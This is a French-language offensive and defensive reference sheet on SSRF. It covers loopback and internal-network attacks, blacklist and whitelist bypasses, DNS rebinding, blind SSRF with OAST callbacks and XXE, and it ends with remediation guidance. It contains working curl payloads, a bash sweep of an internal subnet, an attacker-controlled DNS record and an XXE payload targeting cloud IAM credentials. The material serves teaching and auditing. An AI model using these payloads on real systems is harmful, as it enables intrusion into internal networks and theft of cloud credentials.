---
title: "SSRF — Server-Side Request Forgery"
description: "Référence offensive et défensive sur le SSRF : attaques Loopback, réseau interne, contournement de listes noires/blanches, Blind SSRF (OAST) et remédiation."
tags:
  - web
  - ssrf
  - oast
  - blind-ssrf
  - xxe
  - open-redirect
  - dns-rebinding
  - owasp
---

# 🌐 Vulnérabilité Web : SSRF (Server-Side Request Forgery)

!!! warning "Cadre légal"
    Les techniques décrites ci-dessous ne doivent être mises en œuvre que dans un cadre d'audit autorisé par écrit, ou en environnement de laboratoire.

---

## 1. Généralités & Définitions

### 1.1 Définition

Le **SSRF (Server-Side Request Forgery)** est une vulnérabilité permettant à un attaquant de **forcer le serveur d'une application web à émettre une requête HTTP vers une destination de son choix**, en détournant une fonctionnalité légitime de l'application qui réalise elle-même des requêtes sortantes (récupération d'image à partir d'une URL, appel vers une API tierce, webhook, import de flux, prévisualisation de lien, etc.).

### 1.2 Cibles potentielles

| Catégorie de cible | Exemples |
|---|---|
| **Services internes inaccessibles depuis l'extérieur** | Panneaux d'administration, bases de données, API de gestion, services de métadonnées cloud |
| **Systèmes externes** | Autres sites tiers, API publiques utilisées « au nom » du serveur vulnérable (dissimulation de l'origine réelle, contournement d'une restriction d'IP source) |

### 1.3 Impacts principaux

- **Exécution d'actions non autorisées** sur des services internes (modification de configuration, déclenchement d'opérations administratives).
- **Accès à des données sensibles internes** (fichiers de configuration, identifiants, métadonnées d'instance cloud).
- **Contournement de pare-feux et de restrictions réseau** : le serveur applicatif, lui-même positionné à l'intérieur du périmètre de confiance, agit comme **proxy involontaire** de l'attaquant.
- **Exécution de code à distance (RCE)**, dans les cas les plus critiques, lorsque le service interne atteint via SSRF expose lui-même une fonctionnalité exploitable (API de déploiement, interface de gestion non authentifiée, protocole exploitable via `gopher://`).

### 1.4 Principe fondamental

!!! info "La confiance implicite comme fondement de l'attaque"
    Le SSRF exploite les **relations de confiance implicites** qui existent entre les serveurs, les microservices ou les composants backend d'une même organisation. Un service interne qui n'authentifie pas ses appelants au motif qu'« ils proviennent nécessairement du réseau interne de confiance » devient immédiatement exploitable dès lors qu'un serveur frontal peut être détourné pour relayer une requête en son nom.

---

## 2. SSRF contre le Serveur lui-même (Loopback)

### 2.1 Principe

Cette première catégorie de SSRF exploite la relation de confiance où le **serveur s'adresse à sa propre boucle locale** — `localhost` ou `127.0.0.1` — pour atteindre des fonctionnalités qui ne devraient, en principe, jamais être exposées à un utilisateur distant non authentifié.

### 2.2 Exemple classique

```http
POST /product/stock HTTP/1.1
Host: weliketoshop.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/check?productId=6&storeId=1
```

L'attaquant détourne le paramètre `stockApi`, légitimement destiné à interroger un service de stock interne, pour cibler à la place une ressource d'administration locale :

```http
POST /product/stock HTTP/1.1
Host: weliketoshop.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

stockApi=http://localhost/admin
```

```bash
# Équivalent en ligne de commande pour reproduction rapide
curl -X POST https://weliketoshop.net/product/stock \
  -d "stockApi=http://127.0.0.1/admin"
```

### 2.3 Pourquoi l'accès est-il accordé en local sans authentification ?

**Séparation des composants**

L'accès via `localhost` **court-circuite** un pare-feu applicatif (WAF) ou un **reverse-proxy frontal** positionné en amont de l'application, lequel n'inspecte que le trafic entrant depuis l'extérieur. Une requête émise depuis le serveur lui-même vers sa propre interface locale ne transite **jamais** par ce composant de filtrage.

**Accès de secours (Disaster Recovery)**

Certaines applications conservent des **accès administrateurs ouverts sans authentification**, volontairement réservés aux scénarios de reprise après incident, sous l'hypothèse — souvent erronée — qu'**« seul le serveur lui-même peut y accéder »**.

**Isolation des ports**

Des services internes (panneaux d'administration, interfaces de monitoring, bases de données) écoutent fréquemment sur des **ports spécifiques fermés depuis l'extérieur** par le pare-feu réseau, mais **restent accessibles depuis la machine elle-même**, sans restriction supplémentaire au niveau applicatif.

!!! danger "L'authentification « implicite » par la source réseau est une fausse sécurité"
    Considérer qu'une requête provenant de `127.0.0.1` est nécessairement légitime revient à confondre **origine réseau** et **authentification**. Dès lors qu'une fonctionnalité applicative permet d'émettre une requête arbitraire au nom du serveur, cette hypothèse s'effondre entièrement.

---

## 3. SSRF contre les Systèmes Backend (Réseau Interne)

### 3.1 Principe

Au-delà de la simple boucle locale, le SSRF permet d'atteindre des **machines situées plus loin dans l'infrastructure** : bases de données internes, microservices métier, API de gestion, panneaux d'administration cachés qui ne sont jamais exposés directement sur Internet.

### 3.2 Adresses cibles typiques

L'attaquant cible les plages d'**adresses IP privées et non routables sur Internet** (RFC 1918), généralement utilisées pour le réseau interne de l'organisation :

```text
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.0.0/16    (link-local, inclut souvent les métadonnées cloud : 169.254.169.254)
```

```bash
# Exemple de ciblage d'un service d'administration interne via SSRF
curl -X POST https://cible.com/fetch-preview \
  -d "url=http://192.168.0.68/admin"
```

### 3.3 Faiblesse architecturale sous-jacente

!!! warning "Sécurité périmétrique obsolète (« château fort »)"
    Le SSRF contre les systèmes backend met en échec une architecture reposant sur une **sécurité périmétrique de type « château fort »** : tout ce qui se trouve à l'intérieur du réseau interne est implicitement considéré comme **digne de confiance**, tandis que seul le périmètre externe est réellement défendu. Dans ce modèle, l'application web publique — censée être la frontière du périmètre — devient, via le SSRF, un **proxy involontaire** permettant à un attaquant externe d'agir comme s'il se trouvait physiquement à l'intérieur du réseau de confiance.

Ce constat justifie à lui seul l'adoption de principes **zero-trust** au sein du réseau interne (voir section 7).

---

## 4. Contournement des Défenses & Filtres (Bypasses)

### A. Filtres basés sur les Listes Noires (Blacklists)

Une liste noire qui se contente de bloquer la chaîne littérale `localhost` ou `127.0.0.1` est **triviale à contourner**, tant les représentations alternatives d'une même adresse IP sont nombreuses.

**Notations d'adresses multiples**

| Notation | Exemple | Résultat |
|---|---|---|
| **Décimale (entier 32 bits)** | `http://2130706433/` | Équivaut à `127.0.0.1` |
| **Octale** | `http://017700000001/` | Le préfixe `0` indique une interprétation octale, équivaut également à `127.0.0.1` |
| **Abrégée** | `http://127.1/` | La pile réseau système **complète automatiquement** les octets manquants, équivaut à `127.0.0.1` |
| **Hexadécimale** | `http://0x7f000001/` | Équivaut à `127.0.0.1` |

```bash
# Vérification locale de l'équivalence des notations
curl http://2130706433/
curl http://017700000001/
curl http://127.1/
```

!!! tip "Tester systématiquement toutes les notations alternatives"
    Lors d'un audit, générer et tester **l'ensemble des représentations alternatives** de `127.0.0.1` (et des plages privées ciblées) contre chaque point d'entrée SSRF suspecté, un filtre bloquant une notation ne bloquant pas nécessairement les autres.

**Enregistrement DNS dédié**

L'attaquant enregistre un **nom de domaine sous son propre contrôle** dont l'enregistrement DNS (`A`) pointe directement vers `127.0.0.1` ou vers une adresse IP interne cible :

```text
# Exemple d'enregistrement DNS contrôlé par l'attaquant
evil-domain.attacker.com.    IN    A    127.0.0.1
```

```bash
curl -X POST https://cible.com/fetch \
  -d "url=http://evil-domain.attacker.com/admin"
```

!!! danger "DNS Rebinding : contournement des validations basées sur une résolution unique"
    Une variante avancée consiste, pour l'attaquant, à faire pointer initialement le domaine vers une **IP publique inoffensive** (passant ainsi la phase de validation côté serveur, si celle-ci résout le DNS une première fois pour vérifier la cible), puis à **modifier la réponse DNS** pour que la résolution **effective de la requête** (intervenant quelques instants plus tard, lors de l'appel réseau réel) pointe vers une IP interne. Ce décalage temporel entre **validation** et **utilisation** du nom de domaine (*TOCTOU — Time Of Check To Time Of Use*) contourne toute validation reposant sur une résolution DNS unique en amont de la requête.

**Redirection ouverte (Open Redirect)**

Combinaison d'une **URL de confiance** passant la validation initiale du filtre, effectuant ensuite une **redirection HTTP** vers la ressource interne réellement ciblée (détaillée en section C).

**Encodage URL & casse**

```text
# Encodage hexadécimal des séparateurs pour tromper un filtre basé sur une regex littérale
http://127%2e0%2e0%2e1/admin
http://LOCALHOST/admin
http://LoCaLhOsT/admin
```

!!! warning "Un filtre non canonisé est un filtre contournable"
    Tout filtre qui applique une comparaison **littérale** (chaîne de caractères brute, sensible à la casse, sans décodage préalable des caractères encodés) sur l'URL fournie peut être contourné par un simple changement de **casse** ou un **encodage URL** des séparateurs. La validation doit impérativement s'effectuer **après normalisation et résolution complète** de l'URL.

### B. Filtres basés sur les Listes Blanches (Whitelists)

Même une liste blanche, a priori plus robuste qu'une liste noire, reste vulnérable à des **ambiguïtés de parsing d'URL** entre le composant qui valide l'URL et celui qui l'utilise réellement pour établir la connexion.

**Piège du caractère `@` (identifiants intégrés à l'URL)**

```text
https://expected-host:motdepasse@evil-host.com/admin
```

!!! danger "Le filtre lit la gauche, la pile réseau se connecte à droite"
    Dans la syntaxe standard d'une URL, tout ce qui précède `@` est interprété comme des **identifiants d'authentification** (`utilisateur:motdepasse@`), et la **connexion réseau réelle** est établie vers l'hôte situé **après** le `@`. Un filtre naïf qui se contente de vérifier la présence de `expected-host` **en début de chaîne** valide cette URL, alors que la requête HTTP effective sera envoyée vers `evil-host.com`.

**Piège du caractère `#` (fragment)**

```text
https://evil-host.com#expected-host.com
```

!!! danger "Le filtre lit la fin, le client HTTP l'ignore"
    Le caractère `#` introduit un **fragment d'URL**, qui n'est **jamais transmis au serveur** lors d'une requête HTTP — c'est une donnée purement côté client. Un filtre qui recherche `expected-host.com` n'importe où dans la chaîne (y compris après le `#`) peut être trompé, alors que le client HTTP effectuant réellement la requête **ignore tout ce qui suit le `#`** et se connecte uniquement à `evil-host.com`.

**Hiérarchie DNS (sous-domaine inversé)**

```text
https://expected-host.com.evil-host.com/admin
```

!!! warning "La résolution DNS se lit de droite à gauche"
    Un filtre qui vérifie que la chaîne `expected-host.com` **apparaît quelque part** dans l'URL (vérification par simple sous-chaîne, plutôt que par analyse structurée du nom d'hôte) est trompé par cette construction. Or, la **hiérarchie DNS se résout de droite à gauche** : `expected-host.com.evil-host.com` est en réalité un **sous-domaine du domaine `evil-host.com`**, intégralement sous le contrôle de l'attaquant, qui peut le faire pointer vers n'importe quelle adresse IP de son choix — y compris une IP interne de la cible.

**Encodage / double encodage**

```text
# Double encodage d'un caractère de contrôle pour tromper un filtre qui ne décode qu'une seule fois
http://169.254.169.254/%25....latest/meta-data/
```

!!! tip "Parser l'URL comme le fait réellement le client HTTP"
    La seule défense fiable contre l'ensemble des contournements de cette section consiste à valider l'URL **après** une résolution et une normalisation complètes (décodage intégral, résolution du nom d'hôte canonique), en utilisant **la même bibliothèque de parsing** que celle qui effectuera la requête réseau finale — jamais une regex ou une comparaison de sous-chaîne appliquée sur la chaîne brute.

### C. Open Redirect

L'attaquant injecte, dans un paramètre accepté par la liste blanche, une **URL de confiance** contenant elle-même une **redirection ouverte** vers la ressource interne réellement visée.

```http
GET /product/nextProduct?path=http://192.168.0.68/admin HTTP/1.1
Host: weliketoshop.net
```

```bash
curl -X POST https://cible.com/fetch \
  -d "url=http://weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin"
```

Le serveur applicatif **valide le domaine initial** (`weliketoshop.net`, présent dans sa liste blanche), puis **suit automatiquement la redirection HTTP 302** émise par ce domaine de confiance vers l'adresse interne — hors du périmètre de validation du filtre.

!!! info "Pourquoi cette technique fonctionne"
    La validation de la liste blanche s'effectue **une seule fois, sur l'URL initiale**. Si le client HTTP côté serveur suit les redirections par défaut (comportement très courant des bibliothèques HTTP), **aucune revalidation** n'est appliquée sur l'URL finale effectivement atteinte après redirection — voir la contre-mesure correspondante en section 7.

---

## 5. Blind SSRF (SSRF Aveugle)

### 5.1 Définition

Le **Blind SSRF** survient lorsque l'application **envoie bien la requête** forgée vers l'URL fournie, mais **ne renvoie jamais le contenu de la réponse** dans l'interface front-end accessible à l'attaquant. Il s'agit d'une **attaque à sens unique** : l'attaquant ne dispose d'aucune confirmation visuelle directe que la requête a été émise, ni de son résultat.

### 5.2 Impacts

- **Visibilité nulle** sur les données retournées par le service ciblé — l'attaquant ne peut pas lire directement une réponse.
- **Exécution effective de la requête** demeure néanmoins garantie côté serveur, ce qui reste exploitable pour :
  - Déclencher des **actions destructrices** ou des effets de bord sur le service interne ciblé (sans besoin de lire la réponse).
  - Atteindre une **exécution de code à distance (RCE)** si le service backend atteint est lui-même vulnérable, indépendamment de toute visibilité sur la sortie.

### 5.3 Méthodes de détection et d'exploitation

**Détection OAST (Out-of-Band Application Security Testing)**

!!! tip "Burp Collaborator et équivalents"
    L'utilisation d'un outil de type **callback hors bande** (Burp Collaborator, Interactsh, ou tout serveur DNS/HTTP de callback personnel) permet de **prouver l'existence d'un SSRF aveugle** : l'attaquant fournit comme URL un domaine unique généré par l'outil, puis surveille les **interactions entrantes** (requêtes DNS et/ou HTTP) reçues sur ce domaine.

```bash
# Injection d'un domaine de callback OAST dans un paramètre suspecté vulnérable
curl -X POST https://cible.com/fetch-preview \
  -d "url=http://unique-id.oast-server.com/"
```

```text
Interactions observées côté Collaborator :
 - Requête DNS pour unique-id.oast-server.com   → confirme AU MINIMUM une résolution DNS côté serveur
 - Requête HTTP GET /                           → confirme une connexion TCP et l'émission effective de la requête HTTP
```

!!! info "Distinguer interaction DNS et interaction HTTP"
    Une **simple résolution DNS** sans requête HTTP associée indique généralement une validation côté serveur qui **résout le nom de domaine** (par exemple pour vérifier qu'il ne pointe pas vers une IP privée) **sans jamais établir la connexion réseau complète** — un signal plus faible qu'une interaction HTTP complète, mais qui confirme néanmoins un point d'entrée à approfondir (notamment via DNS rebinding, section 4.A).

**Scan / Sweep du réseau interne en aveugle**

En l'absence de toute visibilité sur les réponses, l'attaquant peut tout de même **cartographier le réseau interne** en mesurant des différences de comportement observables **côté externe**, même minimes :

- **Temps de réponse** de l'application (une IP active répondant rapidement vs un timeout sur une IP inactive).
- **Code de statut HTTP** ou taille de réponse légèrement différente selon que le port ciblé est ouvert, fermé ou filtré.

```bash
# Principe d'un balayage aveugle sur une plage interne (illustratif, à automatiser via Intruder/ffuf)
for ip in 192.168.0.{1..254}; do
  curl -s -o /dev/null -w "%{http_code} %{time_total} $ip\n" \
    -X POST https://cible.com/fetch-preview -d "url=http://$ip/"
done
```

**Exploitation du client HTTP (attaque de la bibliothèque réseau)**

Plutôt que de cibler un service applicatif, l'attaquant peut forcer la connexion du serveur vers un **serveur malveillant sous son contrôle**, lequel renvoie volontairement un **flux de réponse malformé** conçu pour exploiter une faille de parsing dans la **bibliothèque cliente HTTP** utilisée côté serveur (dépassement de tampon, désérialisation non sécurisée d'en-têtes, etc.).

!!! warning "Surface d'attaque souvent sous-estimée"
    Même dans un scénario totalement aveugle où aucune donnée n'est jamais restituée à l'attaquant, la **bibliothèque réseau elle-même** constitue une cible : une vulnérabilité connue (CVE) dans le client HTTP utilisé côté serveur peut transformer un SSRF aveugle anodin en **exécution de code à distance**.

---

## 6. Surface d'Attaque Cachée pour le SSRF

### 6.1 URLs partielles

L'utilisateur ne fournit parfois qu'un **fragment de l'URL finale** (un sous-domaine, un identifiant, ou un chemin), lequel est ensuite **concaténé côté serveur** à une structure fixe prédéfinie dans le code applicatif.

```text
# Exemple : le paramètre utilisateur ne fournit que le sous-domaine
subdomain=stock.weliketoshop.net
# Reconstruction côté serveur :
url = "http://" + subdomain + "/check?productId=6"
```

!!! info "Une URL partielle reste un vecteur SSRF à part entière"
    Même sans contrôle complet sur l'URL finale, un attaquant disposant d'un contrôle **partiel** (sous-domaine, chemin, port) peut parvenir à rediriger la requête vers une cible interne, notamment si le composant concaténé n'est pas correctement validé isolément (ex : injection d'un `@` ou d'un `#` dans le fragment contrôlé — voir section 4.B).

### 6.2 URLs dans les formats de données (XXE)

Les **parseurs XML** configurés pour accepter la résolution d'**entités externes** peuvent être détournés pour forcer le serveur à émettre une requête HTTP vers une URL arbitraire, transformant une vulnérabilité **XXE** en vecteur **SSRF** à part entière.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>
```

!!! danger "XXE et SSRF : deux vulnérabilités, une seule surface d'attaque"
    Tout point d'entrée acceptant un document XML, SVG, ou un format bureautique basé sur XML (`.docx`, `.xlsx`) et dont le parseur **résout les entités externes** constitue, de facto, un point d'entrée SSRF potentiel — y compris dans des contextes où aucune fonctionnalité de « récupération d'URL » n'est explicitement exposée à l'utilisateur. Se référer à la fiche *File Upload* dédiée pour l'exploitation XXE complète via documents uploadés.

### 6.3 SSRF via l'en-tête `Referer`

De nombreuses applications intègrent des **scripts d'analyse d'audience** (analytics) qui **visitent automatiquement**, de façon asynchrone et côté serveur, les URL tierces apparaissant dans l'en-tête HTTP `Referer` des requêtes reçues — par exemple pour enrichir des statistiques de provenance du trafic.

```http
GET /product?id=42 HTTP/1.1
Host: cible.com
Referer: http://192.168.0.68/admin/delete-user?id=1
```

!!! warning "Un en-tête entièrement manipulable par l'attaquant"
    L'en-tête `Referer` est **librement falsifiable** par le client émettant la requête initiale. Si un composant d'analyse côté serveur **suit automatiquement** l'URL qui y figure — sans validation de destination — l'attaquant peut forcer le serveur à émettre une requête arbitraire vers une cible interne, simplement en falsifiant cet en-tête sur une requête HTTP par ailleurs anodine, sans jamais interagir directement avec une fonctionnalité de récupération d'URL visible dans l'interface.

---

## 7. Mesures de Prévention & Remédiation

### 7.1 Validation stricte des entrées

!!! danger "Proscrire l'utilisation directe d'une URL arbitraire fournie par l'utilisateur"
    Dans la mesure du possible, **éviter entièrement** qu'une fonctionnalité applicative accepte une URL arbitraire fournie par l'utilisateur comme destination d'une requête serveur. Lorsque cela est fonctionnellement impossible, restreindre la saisie à une **liste blanche fermée de valeurs autorisées** (identifiants internes mappés côté serveur vers des URLs fixes, plutôt qu'une URL libre), ce qui élimine par construction l'essentiel des vecteurs de contournement décrits en section 4.

### 7.2 Liste blanche stricte de protocoles

```text
Protocoles autorisés  : https
Protocoles interdits  : http (sauf exception justifiée), file://, gopher://, dict://, ftp://, jar://, php://
```

!!! danger "Les protocoles non-HTTP sont une porte dérobée vers le réseau interne"
    Des protocoles tels que `gopher://` permettent de construire des **requêtes brutes arbitraires** vers n'importe quel service TCP (Redis, SMTP, Memcached...), bien au-delà du simple HTTP, transformant un SSRF basique en vecteur d'exploitation **multi-protocoles**. Le protocole `file://` permet quant à lui une **lecture directe du système de fichiers local** du serveur. Ces protocoles doivent être **explicitement exclus** de toute liste blanche, qui ne doit autoriser que `https` (voire `http` uniquement si strictement justifié par le besoin métier).

### 7.3 Désactivation de la redirection automatique

!!! warning "Un client HTTP qui suit les redirections contourne toute validation initiale"
    Configurer explicitement le client HTTP côté serveur pour **ne jamais suivre automatiquement les redirections HTTP** (3xx), ou, à défaut, **revalider systématiquement** chaque URL de destination intermédiaire selon la même politique de liste blanche que l'URL initiale. Cette mesure neutralise directement la technique d'**Open Redirect** décrite en section 4.C.

```python
# Exemple illustratif (bibliothèque requests en Python)
import requests

response = requests.get(url, allow_redirects=False, timeout=5)
```

### 7.4 Isolation réseau (architecture Zero-Trust)

!!! tip "Sortir du modèle « château fort »"
    Isoler les serveurs applicatifs du reste du réseau interne au moyen d'une **segmentation stricte des flux** (micro-segmentation, groupes de sécurité réseau restrictifs n'autorisant que les flux strictement nécessaires) plutôt que de s'appuyer sur une confiance implicite liée à la seule position réseau. Dans une architecture **zero-trust**, chaque service interne **authentifie et autorise explicitement** chaque appelant, indépendamment de son origine réseau apparente — neutralisant ainsi l'impact même d'un SSRF réussi contre le périmètre externe.

### 7.5 Synthèse — checklist de remédiation

- [ ] Aucune fonctionnalité n'accepte une **URL libre** fournie par l'utilisateur sans alternative par liste blanche fermée
- [ ] Liste blanche de **protocoles** limitée à `https` (jamais `file://`, `gopher://`, `dict://`)
- [ ] Validation de l'URL effectuée **après normalisation complète** (décodage, résolution canonique), jamais sur la chaîne brute
- [ ] Toutes les **notations alternatives d'IP** (décimale, octale, abrégée, hexadécimale) et les plages privées sont bloquées en sortie réseau, pas seulement au niveau applicatif
- [ ] **Redirections HTTP désactivées** ou revalidées systématiquement côté client HTTP serveur
- [ ] Parseurs XML (documents, SVG) configurés sans résolution d'**entités externes** (anti-XXE)
- [ ] Scripts d'analyse d'audience ne suivent **jamais automatiquement** une URL issue d'un en-tête `Referer` non validé
- [ ] Segmentation réseau stricte : les services internes **authentifient** chaque appelant, indépendamment de son origine réseau
- [ ] Surveillance et alerting sur les requêtes sortantes anormales (vers IP privées, métadonnées cloud, domaines inconnus)

---

## 8. Références

- [OWASP — Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — SSRF](https://portswigger.net/web-security/ssrf)
- [MITRE CWE-918 : Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP Top 10 2021 — A10:2021 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
